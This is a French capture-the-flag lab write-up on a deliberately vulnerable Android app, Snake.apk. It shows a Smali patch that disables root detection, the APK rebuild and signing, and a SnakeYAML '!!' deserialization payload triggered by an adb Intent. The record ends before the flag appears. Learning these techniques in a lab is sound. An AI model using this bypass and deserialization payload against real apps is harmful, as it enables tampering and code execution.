# LAB-19 — Exploitation d'une désérialisation SnakeYAML sur Android avec patch Smali

## Vue d'ensemble

Ce laboratoire met en scène une application Android nommée **Snake.apk** qui intègre deux défis distincts : une protection anti-root à neutraliser et une vulnérabilité de désérialisation YAML à exploiter. L'objectif final est de récupérer un flag dissimulé dans les journaux système Android.

La chaîne d'exploitation se construit ainsi :

1. Analyse statique du code décompilé
2. Neutralisation de la détection root via patch Smali
3. Reconstruction et signature de l'APK modifié
4. Élaboration d'un payload YAML malveillant
5. Déclenchement de l'exploitation par Intent
6. Extraction du flag depuis logcat

---

## Outillage utilisé

| Outil | Rôle |
|---|---|
| **ADB** | Communication avec l'émulateur |
| **Jadx-GUI** | Décompilation Java de l'APK |
| **apktool** | Extraction et reconstruction du bytecode Smali |
| **uber-apk-signer** | Signature du nouvel APK |
| **VS Code** | Édition des fichiers Smali |
| **logcat** | Capture des logs Android |

---

## Phase 1 — Rétro-ingénierie de l'application

### Analyse avec Jadx-GUI

L'ouverture de Snake.apk dans Jadx-GUI révèle le package `com.pwnsec.snake` et deux classes centrales à l'exploitation : `MainActivity` et `BigBoss`.

Dès l'analyse de `MainActivity`, deux éléments attirent l'attention :

- Le chargement d'une librairie native : `System.loadLibrary("snake")`
- Un ensemble de méthodes de vérification de l'environnement :

```java
checkForDangerousBinaries()
checkForRootManagementApps()
checkForRootShell()
checkForWritableSystem()
isDeviceRooted()
```

### La logique de protection

La méthode `isDeviceRooted()` centralise toutes ces vérifications :

```java
public static boolean isDeviceRooted(Context context) {
    return checkForDangerousBinaries()
        || checkForRootManagementApps(context)
        || checkForWritableSystem()
        || checkForRootShell();
}
```

Si elle retourne `true`, l'application se termine immédiatement dans `onCreate()` :

```java
if (isDeviceRooted(getApplicationContext())) {
    Log.w("Rooted", "Root detected! Exiting application.");
    finish();
    System.exit(0);
}
```

L'émulateur Android étant rooté par nature, cette barrière empêche toute exécution. Il faut la contourner.

---

## Phase 2 — Patch du bytecode Smali

### Extraction avec apktool

```bash
java -jar apktool.jar d Snake.apk -o snake_smali
```

Apktool génère le répertoire `snake_smali/` contenant l'intégralité du code Smali et des ressources.

### Localisation de la cible

Dans VS Code, on navigue jusqu'au fichier contenant `isDeviceRooted`. En Smali, la signature de la méthode est :

```smali
.method public static isDeviceRooted(Landroid/content/Context;)Z
```

> Le `Z` en fin de signature indique un type de retour booléen.

### Application du patch

On remplace le corps complet de la méthode par un retour immédiat à `false` (représenté par `0x0` en Smali) :

```smali
.method public static isDeviceRooted(Landroid/content/Context;)Z
    .locals 1
    const/4 v0, 0x0
    return v0
.end method
```

La méthode retournera désormais `false` en toutes circonstances.

### Reconstruction de l'APK

```bash
java -jar apktool.jar b snake_smali -o snake_patched_unsigned.apk
```

### Signature et installation

Android refuse les APK non signés. On utilise uber-apk-signer pour générer une signature de debug :

```bash
# Désinstallation de l'ancienne version
adb uninstall com.pwnsec.snake

# Installation du build patché et signé
adb install snake_patched_unsigned-aligned-debugSigned.apk
```

Un message `Success` confirme l'installation.

---

## Phase 3 — Exploitation de la désérialisation YAML

### Analyse de BigBoss

La classe `BigBoss` expose un constructeur particulier :

```java
public BigBoss(String str) {
    if (str.equals("Snaaaaaaaaaaaaaake")) {
        String result = stringFromJNI(str); // appel natif
        Log.d("BigBoss: ", hexToAscii(result));
    }
}
```

Le mécanisme est clair : passer la chaîne exacte `Snaaaaaaaaaaaaaake` au constructeur déclenche un appel natif, dont le résultat est converti depuis l'hexadécimal et enregistré dans les logs — c'est là que se cache le flag.

### Construction du payload

SnakeYAML supporte la syntaxe `!!` pour instancier directement des classes Java lors de la désérialisation. Le payload est minimaliste :

```yaml
!!com.pwnsec.snake.BigBoss ["Snaaaaaaaaaaaaaake"]
```

Ce fichier est sauvegardé sous le nom `Skull_Face.yml`.

### Déploiement sur l'émulateur

L'application s'attend à trouver son fichier dans `/sdcard/snake/` :

```bash
adb shell mkdir -p /sdcard/snake
adb push Skull_Face.yml /sdcard/snake/Skull_Face.yml
```

On accorde également la permission de lecture du stockage externe :

```bash
adb shell pm grant com.pwnsec.snake android.permission.READ_EXTERNAL_STORAGE
```

---

## Phase 4 — Déclenchement et récupération du flag

### Lancement via Intent

L'application attend un Intent avec l'extra `SNAKE` valorisé à `BigBoss` :

```bash
adb shell am start -n com.pwnsec.snake/.MainActivity -e SNAKE BigBoss
```

L'écran affiche le message : **"Here's to you Boss 1932-1995"** — l'exploitation est en cours.




